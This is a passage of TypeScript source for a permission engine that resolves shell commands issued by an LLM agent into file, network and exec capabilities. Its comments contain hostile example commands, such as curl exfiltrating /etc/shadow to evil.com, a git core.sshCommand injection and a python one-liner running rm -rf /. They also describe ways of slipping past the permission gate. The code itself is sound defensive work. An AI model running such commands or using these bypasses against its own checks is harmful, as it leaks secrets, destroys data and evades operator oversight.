  const refusedHomeDirs = new Set<string>(
    ctx.home !== '' ? RM_REFUSE_HOME_DIRS.map((rel) => resolvePath(ctx.home, rel)) : [],
  );
  for (const arg of positional) {
    const resolved = resolveArg(arg, ctx);
    if (RM_REFUSE_ROOTS.has(resolved)) {
      return {
        refuse: `rm: refuse to delete system root '${resolved}' (hardcoded blocklist; spec §5.2)`,
      };
    }
    // `rm -rf ~` resolves to `ctx.home`. `rm -rf $HOME` also.
    // Catching the resolved home value covers both shapes.
    if (resolved === ctx.home && ctx.home !== '') {
      return {
        refuse: `rm: refuse to delete operator home '${resolved}' (hardcoded blocklist; spec §5.2)`,
      };
    }
    // Home-relative credential / config dirs. Root-of-dir
    // deletion only; subpaths route through the regular escalate
    // tier via classifyProtectedPath.
    if (refusedHomeDirs.has(resolved)) {
      return {
        refuse: `rm: refuse to delete operator credential/config dir '${resolved}' (hardcoded blocklist)`,
      };
    }
  }
  return {
    capabilities: positional.map((p) => deleteFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

const cmdMvCp: CommandResolver = (positional, tokens, ctx) => {
  // Slice 125 (R2 P1): GNU `-t <dir>` / `--target-directory=<dir>`
  // inverts the positional shape. `mv -t /etc src1 src2` makes
  // `/etc` the destination and `src1`, `src2` the sources.
  // All 4 getopt shapes honored (combined long, spaced long,
  // spaced short, attached short `-t/etc`) via extractValueFlag.
  const targetDirMatches = extractValueFlag(tokens, {
    longForm: '--target-directory',
    shortForm: '-t',
  });
  const targetDir: string | null =
    targetDirMatches.length > 0 ? (targetDirMatches[targetDirMatches.length - 1] ?? null) : null;

  if (targetDir !== null) {
    // All positionals are sources; targetDir is the destination.
    // Filter out the targetDir itself from positionals (it appears
    // in stripFlags output but was already consumed as the flag value).
    const srcs = positional.filter((p) => p !== targetDir);
    if (srcs.length === 0) {
      return { refuse: 'mv/cp: -t/--target-directory needs at least one source' };
    }
    return {
      capabilities: [
        ...srcs.map((s) => readFs(resolveArg(s, ctx))),
        writeFs(resolveArg(targetDir, ctx)),
      ],
      confidence: 'high',
    };
  }

  if (positional.length < 2) {
    return { refuse: 'mv/cp: needs at least source and destination' };
  }
  const dst = positional[positional.length - 1] as string;
  const srcs = positional.slice(0, -1);
  return {
    capabilities: [...srcs.map((s) => readFs(resolveArg(s, ctx))), writeFs(resolveArg(dst, ctx))],
    confidence: 'high',
  };
};

const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.some((t) => t === '--proxy' || t === '-x')) {
    return { refuse: 'curl/wget: proxy-shaped flags suggest evasion' };
  }
  // Detect `-o <path>` / `--output <path>` (curl) and `-O` /
  // `--output-document` (wget); also support combined-form
  // `-o<path>` and `--output=<path>` shapes (slice 98, R2 #200).
  // Pre-slice the resolver emitted ONLY `net-egress:<host>` for
  // these shapes, hiding the WRITE side of the call from the
  // capability audit and the §11 protected-path check. An
  // adversarial `curl evil.com/payload -o /etc/agent/policy.toml`
  // would slip past both layers because `/etc/agent/policy.toml`
  // never appeared as a write target. Slice 98 emits the write
  // capability so the engine's protected-path classifier sees the
  // target and §11 fires for the `/etc/*` escalate tier.
  //
  // wget's `-O <file>` is the same shape as curl's `-o`; both
  // resolvers also honor `wget -P <dir>` (prefix directory). For
  // forms we can't decisively map (`-O-` writes to stdout, `-O` with
  // no operand is wget syntactic noise), we don't emit a write
  // capability — the URL-side egress still covers the net side, and
  // the operator's modal will see the literal command.
  // Simple path-flag decodes — flags whose value is a literal
  // FILE path, no embedded `@` / `<` parsing. Each spec is
  // honored across all 4 getopt shapes via extractValueFlag.
  // The value `-` (curl stdin/stdout marker) is filtered out.
  const CURL_WRITE_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--output', shortForm: '-o' },
    { longForm: '--output-document', shortForm: '-O' },
    { longForm: '--cookie-jar', shortForm: '-c' },
    { longForm: '--dump-header', shortForm: '-D' },
    { longForm: '--trace' },
    { longForm: '--trace-ascii' },
  ];
  const CURL_READ_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--upload-file', shortForm: '-T' },
    { longForm: '--config', shortForm: '-K' },
    { longForm: '--netrc-file' },
    { longForm: '--cacert' },
  ];
  const writeTargets: string[] = [];
  const readTargets: string[] = [];
  for (const spec of CURL_WRITE_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) {
      if (v !== '-') writeTargets.push(v);
    }
  }
  for (const spec of CURL_READ_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) {
      if (v !== '-') readTargets.push(v);
    }
  }

  // Custom decodes — flags whose value carries an `@<file>` /
  // `<<file>` / `name@file` shape that needs prefix-stripping
  // before recording a read. Iteration-based; the spec helper
  // doesn't capture these forms.
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    // Slice 174 (review — info-leak P0). curl's POST body flags
    // expand a leading `@` into "read body from this file":
    //   curl --data @/etc/shadow         (file → request body)
    //   curl -d @/var/log/auth.log       (short form)
    //   curl --data-binary @creds.json   (binary body)
    //   curl --data-ascii @file          (ascii body)
    //   curl --data-urlencode @file      (urlencode bare-@ form)
    //   curl --data-urlencode name@file  (urlencode name+file form)
    // Pre-slice the resolver emitted ONLY net-egress for these
    // shapes — the FILE READ side of the call was invisible to
    // both the capability audit and §11 protected-path classifier.
    // An adversarial `curl evil.com --data @/etc/shadow` walked
    // past `deny: read-fs:/etc/**` because read-fs was never
    // emitted. Now we decode `@<path>` from all body-bearing flags
    // and emit `readFs(<path>)` so the engine sees the exfil.
    //
    // `--data-raw` is intentionally excluded: curl's docs explicitly
    // say it does NOT honor the `@` prefix (the leading `@` is sent
    // as a literal byte). Including it here would emit spurious
    // read caps for legitimate raw-text bodies starting with `@`.
    //
    // `--form` / `-F` is similar but its `@`/`<` shape is part of
    // a `key=@<file>` / `key=<@file>` value; handled below.
    const dataBodyFlags: ReadonlySet<string> = new Set([
      '--data',
      '--data-binary',
      '--data-ascii',
      '-d',
    ]);
    // `--data=@<path>` / `-d=@<path>` (combined form). curl doesn't
    // officially document the `=` shape for short `-d`, but some
    // wrappers emit it; cover both.
    let combinedFlag: string | null = null;
    let combinedValue: string | null = null;
    if (t.startsWith('--data=')) {
      combinedFlag = '--data';
      combinedValue = t.slice('--data='.length);
    } else if (t.startsWith('--data-binary=')) {
      combinedFlag = '--data-binary';
      combinedValue = t.slice('--data-binary='.length);
    } else if (t.startsWith('--data-ascii=')) {
      combinedFlag = '--data-ascii';
      combinedValue = t.slice('--data-ascii='.length);
    }
    if (combinedFlag !== null && combinedValue !== null) {
      if (combinedValue.startsWith('@') && combinedValue.length > 1) {
        readTargets.push(combinedValue.slice(1));
      }
      continue;
    }
    if (dataBodyFlags.has(t)) {
      const next = tokens[i + 1];
      if (next?.startsWith('@') && next.length > 1) {
        readTargets.push(next.slice(1));
        i += 1;
      } else if (next !== undefined && !next.startsWith('-')) {
        // Inline body (not a file read); still consume so the
        // next-token scan doesn't misread it as a flag/URL.
        i += 1;
      }
      continue;
    }
    // `--data-urlencode` has TWO file-bearing shapes per curl docs:
    //   --data-urlencode @file         (urlencode whole file)
    //   --data-urlencode name@file     (urlencode file as name=value)
    // Both expand the file at `@`'s position. The bare-name shape
    // `--data-urlencode foo=bar` does NOT read a file. Decode both
    // file shapes; ignore the others.
    if (t === '--data-urlencode') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        if (next.startsWith('@') && next.length > 1) {
          readTargets.push(next.slice(1));
        } else {
          const atIdx = next.indexOf('@');
          if (atIdx > 0 && atIdx < next.length - 1) {
            readTargets.push(next.slice(atIdx + 1));
          }
        }
        i += 1;
      }
      continue;
    }
    if (t.startsWith('--data-urlencode=')) {
      const value = t.slice('--data-urlencode='.length);
      if (value.startsWith('@') && value.length > 1) {
        readTargets.push(value.slice(1));
      } else {
        const atIdx = value.indexOf('@');
        if (atIdx > 0 && atIdx < value.length - 1) {
          readTargets.push(value.slice(atIdx + 1));
        }
      }
      continue;
    }
    // curl --form / -F: multipart shape `<key>=@<file>` or
    // `<key>=<@file>;type=...`. The `@` (binary) and `<` (text
    // body) prefixes both indicate file reads; mirror curl's
    // behavior. Same `--form=<value>` combined form is accepted.
    let formValue: string | null = null;
    if (t === '--form' || t === '-F') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        formValue = next;
        i += 1;
      }
    } else if (t.startsWith('--form=')) {
      formValue = t.slice('--form='.length);
    }
    if (formValue !== null) {
      const eqIdx = formValue.indexOf('=');
      if (eqIdx !== -1) {
        const valuePart = formValue.slice(eqIdx + 1);
        // Strip leading `@` or `<` prefix. Stop at the FIRST `;`
        // so trailing `type=...`/`filename=...` modifiers don't
        // get bolted into the path. An empty path after stripping
        // (e.g. `key=@`) emits nothing.
        if (valuePart.startsWith('@') || valuePart.startsWith('<')) {
          const rest = valuePart.slice(1);
          const semiIdx = rest.indexOf(';');
          const path = semiIdx === -1 ? rest : rest.slice(0, semiIdx);
          if (path.length > 0) readTargets.push(path);
        }
      }
    }
  }
  const urlToken = positional[0];
  const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
  // Slice 128 (R4 P1-Launder): include the new read targets in the
  // emitted capability set so the engine's per-arg classifier sees
  // them.
  const readCaps = readTargets.map((p) => readFs(resolveArg(p, ctx)));
  if (urlToken === undefined) {
    return {
      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
      confidence: 'medium',
    };
  }
  try {
    const host = new URL(urlToken).hostname.toLowerCase();
    return {
      capabilities: [netEgress(host || '*'), ...writeCaps, ...readCaps],
      confidence: 'high',
    };
  } catch {
    return {
      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
      confidence: 'medium',
    };
  }
};

const cmdGit: CommandResolver = (positional, tokens, ctx) => {
  // Slice 128 (R4 P0-Launder-2): `git -c <key>=<value>` sets a
  // one-shot config override. Several git config keys execute
  // arbitrary commands:
  //   core.sshCommand    — used by every git remote operation
  //   core.pager         — pages log/diff output
  //   core.fsmonitor     — invoked on status
  //   core.editor        — invoked on commit / rebase
  //   gpg.program        — sign / verify
  // An LLM typing `git -c core.sshCommand='sh -c "id"' clone X`
  // bypasses cmdGit's clone case (because `-c` is in tokens but
  // `core.sshCommand=...` is a positional [stripFlags doesn't
  // strip non-`-` tokens]). The switch picks `clone` as the
  // subcommand — emits gitWrite + netEgress but NO exec:arbitrary.
  //
  // Defense: refuse static analysis when `-c` or `--config-env`
  // is present. Operator workflows that legitimately need git
  // config overrides should use `~/.gitconfig` or per-repo
  // `.git/config` instead (which the engine can audit through the
  // file path).
  //
  // Also: `--exec-path=<path>` overrides where git looks for its
  // helper binaries — attacker can plant a fake `git-clone` at
  // `<path>/git-clone` and trigger it via the surrounding clone
  // call. Refuse.
  for (const t of tokens) {
    if (t === '-c' || t === '--config-env') {
      return {
        refuse:
          'git: -c / --config-env overrides arbitrary git config (including core.sshCommand / core.pager) — refusing static analysis',
      };
    }
    if (t === '--exec-path' || t.startsWith('--exec-path=')) {
      return {
        refuse:
          'git: --exec-path overrides git helper-binary lookup path — refusing static analysis',
      };
    }
    // Slice 129 (R5 P0-2): --git-dir / --work-tree re-point git
    // to an attacker-controlled metadata location. The targeted
    // `.git/config` at that path can carry core.sshCommand /
    // core.pager / core.fsmonitor — same threat shape as `-c`
    // but via path indirection. Slice 128 closed `-c`; this
    // closes the sibling.
    if (t === '--git-dir' || t.startsWith('--git-dir=')) {
      return {
        refuse:
          "git: --git-dir re-points git's metadata dir; attacker-controlled .git/config can carry core.sshCommand / core.pager — refusing static analysis",
      };
    }
    if (t === '--work-tree' || t.startsWith('--work-tree=')) {
      return {
        refuse:
          "git: --work-tree re-points git's working tree to an attacker-controlled location — refusing static analysis",
      };
    }
  }
  const sub = positional[0];
  const REPO = ctx.cwd;
  if (sub === undefined) {
    return { capabilities: [readFs(REPO)], confidence: 'high' };
  }
  switch (sub) {
    case 'status':
    case 'log':
    case 'diff':
    case 'show':
    case 'blame':
    case 'rev-parse':
    case 'config':
    case 'remote':
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    case 'commit':
    case 'add':
    case 'merge':
    case 'rebase':
    case 'cherry-pick':
    case 'stash':
    case 'tag':
    case 'reset':
      return { capabilities: [gitWrite(REPO), readFs(REPO)], confidence: 'high' };
    case 'push':
    case 'pull':
    case 'fetch':
      return {
        capabilities: [gitWrite(REPO), netEgress('*'), readFs(REPO)],
        confidence: 'high',
      };
    case 'clean':
      if (tokens.some((t) => /^-f/.test(t))) {
        return { capabilities: [deleteFs(REPO), gitWrite(REPO)], confidence: 'high' };
      }
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    default:
      // Slice 152 (review calibration): unknown git subcommand
      // drops to confidence='low', not 'medium'. The known
      // subcommands above carry 'high' because we've verified
      // their side-effect shape; an unknown subcommand (`git lfs`,
      // `git subtree`, `git svn`, `git p4`, `git annex`, or a
      // typo) is genuinely "we don't know what this touches".
      // Spec §5.2's confidence ladder maps 'low' to "I'm
      // guessing, escalate the gate" — combined with the
      // conservative capability set (gitWrite + readFs +
      // netEgress:*) the score crosses the 0.4 confirm threshold
      // by a wide margin. Pre-slice the default branch was
      // 'medium' (+0.10) which slipped under the threshold for
      // some compositions; 'low' (+0.30) hardens that.
      return {
        capabilities: [gitWrite(REPO), readFs(REPO), netEgress('*')],
        confidence: 'low',
      };
  }
};

// Node-ecosystem package managers (npm, yarn, pnpm, bun). Hosts and
// target dirs reflect what those tools actually touch — `node_modules`
// under cwd, plus the npm + yarn registries. Pre-slice 100 (R2 #205)
// `cmdPkgInstall` collapsed every package manager to the SAME shape,
// emitting npm hosts for pip and pypi hosts for npm; the audit row
// lied about which network namespace each invocation actually reached.
const cmdNpmLike: CommandResolver = (_positional, tokens, ctx) => {
  // Slice 179 (review — permission-bypass P1). npm / yarn / pnpm /
  // bun all accept flags that REDIRECT where files land:
  //   --prefix <dir>            (npm/pnpm)  install root
  //   --prefix=<dir>            (combined form)
  //   --pack-destination <dir>  (npm pack)  output dir
  //   -g / --global             writes to npm's global prefix root
  //   --cache <dir>             (npm)       cache dir; written + read
  //   --modules-folder <dir>    (yarn)      alt node_modules root
  // Pre-slice the resolver hardcoded `writeFs(<cwd>/node_modules)`
  // and an operator policy `deny: write-fs:/tmp/**` couldn't see
  // a redirected install at `/tmp/exfil`. Decode the flag operands
  // and emit writeFs for each redirected target so the engine's
  // policy + §11 floor see the actual writes.
  //
  // We DON'T attempt to resolve `--global`'s target (it depends on
  // the operator's npm config: `npm config get prefix`); the
  // resolver isn't allowed to shell out. Emit a marker scope
  // `<npm-global-prefix>` — the operator's modal renders it
  // verbatim and a policy author who wants to gate global installs
  // can match against the literal token. Realistic operators
  // either trust npm globally or use confirm rules; the marker
  // makes the intent visible in the audit row.
  // npm/yarn/pnpm/bun's redirect flags are all long-only (no short
  // forms) with REQUIRED values. Helper handles combined + spaced
  // forms uniformly.
  const NPM_WRITE_PATH_SPECS: readonly { longForm: string }[] = [
    { longForm: '--prefix' },
    { longForm: '--pack-destination' },
    { longForm: '--cache' },
    { longForm: '--modules-folder' },
  ];
  const writeTargets: string[] = [];
  for (const spec of NPM_WRITE_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) writeTargets.push(v);
  }
  // `-g` / `--global` is a boolean — tracked separately so the
  // marker `<npm-global-prefix>` write-fs can be emitted.
  const globalFlag = tokens.some((t) => t === '-g' || t === '--global');

  const caps: Capability[] = [
    exec('arbitrary'),
    readFs(ctx.cwd),
    netEgress('registry.npmjs.org'),
    netEgress('registry.yarnpkg.com'),
  ];
  // Default `node_modules` under cwd is the typical landing zone;
  // emit it unless an explicit redirect superseded it AND the
  // command is install-shaped (the planner can choose between
  // cwd-local install vs. redirected install at static time —
  // hard to tell; emit both to be conservative).
  caps.push(writeFs(resolvePath(ctx.cwd, 'node_modules')));
  for (const p of writeTargets) caps.push(writeFs(resolveArg(p, ctx)));
  if (globalFlag) {
    // Marker scope — operator's policy can match literal
    // `write-fs:<npm-global-prefix>` if they want to gate
    // global installs. Operator modal shows this verbatim.
    caps.push(writeFs('<npm-global-prefix>'));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// Python ecosystem (pip, pip3). pip writes to site-packages (system or
// venv path; we don't try to resolve it deterministically — `arbitrary
// + read-fs:cwd` covers the worst case) and reaches PyPI. Other
// registries (private mirrors, conda) require operator-side allow
// rules that match the explicit `--index-url` flag — out of scope
// for the static resolver.
const cmdPip: CommandResolver = (_positional, tokens, ctx) => {
  // Slice 179 (review — permission-bypass P1). pip redirects writes
  // via several flags that pre-slice the resolver ignored:
  //   --target <dir>            install into <dir> (instead of
  //                              site-packages)
  //   --target=<dir>            combined form
  //   --prefix <dir>            install root prefix
  //   --root <dir>              install to <dir>/PREFIX
  //   --user                    install to user's site-packages
  //                              (~/.local/lib/...)
  //   --cache-dir <dir>         cache dir (writes wheel cache)
  //   --no-cache-dir            disables cache (no-op for caps)
  //   -d / --download <dir>     (deprecated) download to dir
  //   -t <dir>                  short form of --target
  // Pre-slice `pip install --target /tmp/exfil foo` walked past
  // `deny: write-fs:/tmp/**`. Decode each and emit writeFs so the
  // engine sees the actual redirected write.
  // pip's redirect flags — REQUIRED values. `--target` aliases `-t`
  // and `--download` aliases `-d`; both short forms support the
  // attached shape (`pip -t/tmp/exfil foo` was a bypass pre-fix).
  // The other three are long-only.
  const PIP_WRITE_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--target', shortForm: '-t' },
    { longForm: '--prefix' },
    { longForm: '--root' },
    { longForm: '--cache-dir' },
    { longForm: '--download', shortForm: '-d' },
  ];
  const writeTargets: string[] = [];
  for (const spec of PIP_WRITE_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) writeTargets.push(v);
  }
  // `--user` is a boolean — tracked separately so `~/.local` write
  // scope can be emitted.
  const userFlag = tokens.some((t) => t === '--user');

  const caps: Capability[] = [exec('arbitrary'), readFs(ctx.cwd), netEgress('pypi.org')];
  for (const p of writeTargets) caps.push(writeFs(resolveArg(p, ctx)));
  if (userFlag) {
    // `pip install --user foo` writes to `~/.local/lib/python*/site-packages`.
    // Emit a tilde-expanded scope so the engine's protected-path
    // classifier sees the home-relative write. We don't pin the
    // python version — the operator's policy patterns can use
    // `write-fs:~/.local/**` to gate broadly.
    caps.push(writeFs(resolveArg('~/.local', ctx)));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// `chmod MODE FILE...` / `chown OWNER FILE...` — first positional
// is MODE (numeric `644` or symbolic `u+x`) or OWNER (`root`,
// `root:wheel`), not a path. The first positional must NOT be
// emitted as a writeFs target.
//
// Exception: `chmod --reference=REF FILE...` (and chown). With
// `--reference`, GNU coreutils drops the MODE/OWNER positional
// entirely — every remaining positional IS a target. The
// reference file (REF) is read for its current mode/owner; emit a
// readFs for it. Both the combined-form `--reference=REF` and the
// space-separated `--reference REF` are honored.
const CHMOD_VALUE_FLAGS: ReadonlySet<string> = new Set(['--reference']);

const cmdChmodChown: CommandResolver = (_positional, tokens, ctx) => {
  const positional = stripFlags(tokens, CHMOD_VALUE_FLAGS);

  // hasReference: was the `--reference` literal seen at all (with
  // or without an extractable value)? Drops the MODE/OWNER
  // positional from the branch. referenceFile: the decoded path,
  // when extractable. Last match wins on multiple occurrences.
  const hasReference = tokens.some((t) => t === '--reference' || t.startsWith('--reference='));
  const refMatches = extractValueFlag(tokens, { longForm: '--reference' });
  const referenceFile: string | null =
    refMatches.length > 0 ? (refMatches[refMatches.length - 1] ?? null) : null;

  if (hasReference) {
    if (positional.length === 0) {
      return { refuse: 'chmod/chown: --reference needs at least one target' };
    }
    const caps: Capability[] = positional.map((p) => writeFs(resolveArg(p, ctx)));
    if (referenceFile !== null) caps.push(readFs(resolveArg(referenceFile, ctx)));
    return { capabilities: caps, confidence: 'high' };
  }

  if (positional.length < 2) {
    return { refuse: 'chmod/chown: needs MODE/OWNER plus at least one target' };
  }
  const targets = positional.slice(1);
  return {
    capabilities: targets.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Language interpreters (python, python3, node, ruby, perl). Slice
// 100 (R2 #208): pre-slice the resolver emitted `exec:arbitrary +
// read-fs:cwd` for ANY invocation regardless of args — including
// the `-c "..."` shape that hands the interpreter an arbitrary code
// string to execute. While `exec:arbitrary` honestly admits "this
// can run anything", it doesn't distinguish a script-file invocation
// (statically analyzable) from inline-code execution. A policy that
// allowed `exec:python` via a narrow bash allow rule for known
// `python script.py` invocations would silently admit `python -c
// "import os; os.system('rm -rf /')"` under the same umbrella.
//
// Defense: refuse when `-c <code>` is present. Operators wanting
// inline interpreter exec must wire it through a separate tool with
// explicit confirm semantics; the bash resolver isn't the right
// place to model arbitrary inline-code execution shapes.
const cmdInterpreter: CommandResolver = (_positional, tokens, ctx) => {
  // `-c` indicates inline code. Both POSIX (`python -c "code"`) and
  // perl-specific variants (`-e`/`-E` for one-liners) collapse here
  // — perl's `-e` is the same threat model. Refuse the lot.
  //
  // Slice 128 (R4 P1-Launder): node accepts `--eval` (long form of
  // `-e`) which slice 100 missed. Refuse it under the same banner.
  // Also `-m <module>` for python (loads + executes a module by
  // name) is the same threat shape; refuse.
  let hasNetIngress = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i];
    if (t === '-c' || t === '-e' || t === '-E' || t === '--eval' || t === '-m') {
      return {
        refuse: `interpreter: '${t} <code>' executes inline code; refusing static analysis`,
      };
    }
    // Slice 128 (R4 P1-Launder): `node --inspect[=<host:port>]` /
    // `--inspect-brk[=...]` opens a debugger listener. Anything
    // reaching the port gets full V8 control. Attribute net-ingress
    // so the operator's policy sees the listener side effect.
    if (
      t === '--inspect' ||
      t === '--inspect-brk' ||
      (t !== undefined && (t.startsWith('--inspect=') || t.startsWith('--inspect-brk=')))
    ) {
      hasNetIngress = true;
    }
  }
  const caps: Capability[] = [exec('arbitrary'), readFs(ctx.cwd)];
  if (hasNetIngress) caps.push(netIngress('*'));
  return {
    capabilities: caps,
    confidence: 'high',
  };
};

// No-op commands: builtins / utilities with no filesystem or
// network side effect. They get just the baseline `exec:shell`
// from the aggregator above. Listed explicitly here (instead of
// falling through to "unknown command Refuse") so common operator
// shapes don't pop a modal for every `sleep 30` or `true`.
const cmdNoOp: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// Read-only system info / identity / lookup utilities. They
// consult system state (env, /etc/passwd, /etc/group, $PATH
// resolution); resolver attributes a coarse read-fs of /etc as
// the worst case. The classifier_protected_paths will still
// catch any caller-supplied paths.
// `cmdSysInfo` covers commands that DO read /etc — `whoami` /
// `id` / `groups` read `/etc/passwd` to translate uid → name.
// Emitting readFs('/etc') is the conservative super-set of what
// they actually open (could be `/etc/nsswitch.conf`, `/etc/passwd`,
// `/etc/group`); the protected_paths classifier still gates
// caller-supplied paths.
const cmdSysInfo: CommandResolver = () => ({
  capabilities: [readFs('/etc')],
  confidence: 'high',
});

// Slice 152 (review calibration): commands that DON'T touch /etc
// despite being grouped under "sysinfo" in the COMMAND_TABLE.
//   date          — clock_gettime syscall
//   uptime        — /proc/uptime + utmp on Linux, sysctl on macOS;
//                   neither path is under /etc
//   hostname      — gethostname syscall; reads kernel hostname
//   uname         — uname syscall
//   printenv      — reads its own environ; touches nothing on disk
//
// Pre-slice all five emitted readFs('/etc') via cmdSysInfo —
// false positive that bloated the resolved capability set,
// tripped `workspace_escape` (+0.15) in the score gate for a
// `date` call, and forced unnecessary confirm prompts. Empty
// capability set is the honest characterization.
const cmdSysInfoNoEtc: CommandResolver = () => ({
  capabilities: [],
  confidence: 'high',
});

// Slice 139 C1: `env` is structurally a program launcher, not a
// sysinfo verb. With ANY positional it runs the trailing program
// with the surrounding env: `env python -c '...'`, `env perl -e
// '...'`, `env tar --to-command='...'`, `env node --eval '...'`
// — every one bypasses COMMAND_TABLE resolution for the actual
// program. Same launder class slice 128 closed for `command` and
// `builtin` via HARD_REFUSE_COMMANDS; `env` was missed because it
// sat in `cmdSysInfo` (which returns the noop sysinfo shape
// regardless of positionals). A narrow operator allow like
// `bash: env *` then silently admits arbitrary execution.
//
// Defensive cut: refuse any positional usage. Bare `env` (listing
// every var) is the only legitimate LLM-emitted shape and still
// resolves to `readFs('/etc')`. Operators with a `env -u FOO bash`
// workflow can express it as the bare `bash` invocation; the env-
// stripping pre-step has no security value at the policy layer.
//
// `printenv [VAR]` is NOT a launcher (it only reads); kept on
// `cmdSysInfo`.
const cmdEnv: CommandResolver = (positional) => {
  if (positional.length > 0) {
    return {
      refuse:
        'env: positional usage is a program launcher; refusing to launder exec attribution (use the wrapped tool directly)',
    };
  }
  return { capabilities: [readFs('/etc')], confidence: 'high' };
};

// Filesystem-mutating utilities that create or touch a target.
// mkdir / touch / ln / mktemp: positional args are the targets.
// Each takes its own set of value-flags whose operand is NOT a
// path (mode bits, timestamps, link suffixes, etc.); without
// consuming them the operand lands as a bogus writeFs target
// (`mkdir -m 755 dir` → bogus `write-fs:<cwd>/755`).
// `-Z` and `--context` are NOT here: per `mkdir --help`, `-Z` takes
// NO operand (sets the default SELinux context); `--context[=CTX]`
// has an optional value that must use `=`. The next token after
// either flag is the DIRECTORY operand, not a value to consume —
// including them would drop the real write target and let policies
// like `deny: write-fs:/tmp/**` miss `mkdir -Z /tmp/dir`.
const MKDIR_VALUE_FLAGS: ReadonlySet<string> = new Set(['-m', '--mode']);
const TOUCH_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '-d',
  '--date',
  '-t',
  '-r',
  '--reference',
  '--time',
]);
// ln's value-flags whose operand is NOT a write target. `-t /dir`
// and `--target-directory=/dir` ARE write destinations and are
// handled below in cmdLn — listing them here would drop the
// destination from capability attribution, letting `ln -t
// /protected src` bypass a `deny: write-fs:/protected/**` rule.
const LN_VALUE_FLAGS: ReadonlySet<string> = new Set(['-S', '--suffix']);
// mktemp value-flags whose operand is NOT a path destination.
// `-p DIR` / `--tmpdir[=DIR]` ARE write destinations — handled in
// cmdMktemp so a policy denying writes outside the workspace
// (e.g., /tmp) sees the actual write location. Listing them here
// would drop DIR from capability attribution.
const MKTEMP_VALUE_FLAGS: ReadonlySet<string> = new Set(['--suffix']);

const emitTargetsAsWrites = (positional: readonly string[], ctx: ResolverContext) => {
  if (positional.length === 0) {
    return { capabilities: [writeFs(ctx.cwd)], confidence: 'high' as const };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high' as const,
  };
};

const cmdMkdir: CommandResolver = (_positional, tokens, ctx) => {
  return emitTargetsAsWrites(stripFlags(tokens, MKDIR_VALUE_FLAGS), ctx);
};

// touch's `-r REF` / `--reference=REF` reads REF's mtime/atime.
// Emit a readFs alongside the targets so a policy that denies reads
// from the reference's path can fire.
const cmdTouch: CommandResolver = (_positional, tokens, ctx) => {
  const positional = stripFlags(tokens, TOUCH_VALUE_FLAGS);
  const refMatches = extractValueFlag(tokens, { longForm: '--reference', shortForm: '-r' });
  const referenceFile: string | null =
    refMatches.length > 0 ? (refMatches[refMatches.length - 1] ?? null) : null;
  const base = emitTargetsAsWrites(positional, ctx);
  if (referenceFile === null) return base;
  return {
    capabilities: [...base.capabilities, readFs(resolveArg(referenceFile, ctx))],
    confidence: base.confidence,
  };
};

// `ln -t DIR SRC...` / `--target-directory=DIR SRC...` inverts the
// shape: DIR is the write destination (links are created there),
// SRC... are read sources. Without this branch the LN_VALUE_FLAGS
// approach would silently drop DIR from the capability set,
// letting `ln -t /protected src` bypass a deny on /protected.
// Parallel to cmdMvCp's --target-directory handling.
const cmdLn: CommandResolver = (_positional, tokens, ctx) => {
  // Last `-t`/`--target-directory` wins (matches coreutils
  // semantics — later override earlier). All 4 getopt shapes
  // honored via extractValueFlag.
  const targetDirMatches = extractValueFlag(tokens, {
    longForm: '--target-directory',
    shortForm: '-t',
  });
  const targetDir: string | null =
    targetDirMatches.length > 0 ? (targetDirMatches[targetDirMatches.length - 1] ?? null) : null;
  const positional = stripFlags(tokens, LN_VALUE_FLAGS);

  if (targetDir !== null) {
    // All positionals are sources (links created inside targetDir).
    // Filter targetDir out if it appears in positional (space-
    // separated `-t DIR` leaves DIR in args).
    const srcs = positional.filter((p) => p !== targetDir);
    if (srcs.length === 0) {
      return { refuse: 'ln: -t/--target-directory needs at least one source' };
    }
    return {
      capabilities: [
        ...srcs.map((s) => readFs(resolveArg(s, ctx))),
        writeFs(resolveArg(targetDir, ctx)),
      ],
      confidence: 'high',
    };
  }

  return emitTargetsAsWrites(positional, ctx);
};

// `mktemp -p DIR TEMPLATE` / `--tmpdir=DIR TEMPLATE` creates the
// file inside DIR. The destination MUST surface as a write so a
// policy denying writes outside the workspace (e.g., `/tmp`) can
// fire. Without DIR explicitly resolved, mktemp picks `$TMPDIR`
// or `/tmp` at runtime — that case stays as the fallback (cwd-
// relative attribution) and is a known limitation.
const cmdMktemp: CommandResolver = (_positional, tokens, ctx) => {
  // `-p DIR` and `--tmpdir[=DIR]` have different getopt shapes:
  //   - `-p` is REQUIRED-argument (per `mktemp --help` "-p DIR");
  //     consume spaced + attached short forms.
  //   - `--tmpdir` is OPTIONAL-argument; consume ONLY via `=` or
  //     attached short. Spaced `--tmpdir tmpXXX` leaves tmpXXX as
  //     the TEMPLATE (default tmpdir used by mktemp at runtime).
  //     Without optionalValue=true the helper would over-consume
  //     the template and emit a wrong write-fs scope.
  const tmpdirMatches = [
    ...extractValueFlag(tokens, { shortForm: '-p' }),
    ...extractValueFlag(tokens, { longForm: '--tmpdir', optionalValue: true }),
  ];
  const tmpdir: string | null =
    tmpdirMatches.length > 0 ? (tmpdirMatches[tmpdirMatches.length - 1] ?? null) : null;
